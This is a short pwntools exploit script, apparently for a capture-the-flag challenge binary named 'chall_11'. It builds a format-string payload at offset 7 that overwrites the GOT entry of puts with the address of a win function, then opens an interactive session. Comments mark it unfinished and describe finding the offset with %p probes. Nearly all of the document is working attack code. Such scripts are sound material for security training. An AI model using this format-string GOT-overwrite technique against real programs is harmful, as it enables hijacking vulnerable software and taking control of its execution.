from pwn import *
binary = context.binary = ELF('./chall_11')
p = process(binary.path)

offset = 7

payload = fmtstr_payload(offset,{binary.got.puts:binary.sym.win})
p.sendline(payload)

#null = payload.find(b'\x00')
#p.recvuntil(payload[null-3:null])

p.interactive()

# NOT FINISHED
#Sending $p until you get the the same value as the input. This will give you the offset. 
#After the offset you need to swape puts with win. 
